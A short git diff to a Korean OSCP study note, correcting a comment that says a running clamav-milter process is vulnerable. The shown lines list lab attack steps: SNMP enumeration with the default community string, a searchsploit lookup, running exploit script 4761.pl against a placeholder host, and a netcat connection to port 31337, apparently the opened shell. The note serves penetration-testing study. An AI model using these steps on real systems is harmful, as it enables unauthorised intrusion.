@@ -25,11 +25,9 @@ OSCP 자격증 합격을 위해 유용한 문제들로 구성된 [리스트](htt
 # smtp get info
 snmpwalk 192.168.xxx.xxx -c public
 
-# 실행중인 proclamav-milter
+# 실행중인 process 중 clamav-milter 에 취약점 있음
 searchsploit clamav-milter
-
 perl 4761.pl 192.168.xxx.xxx
-
 nc -nv 192.168.xxx.xxx 31337
 ```
 
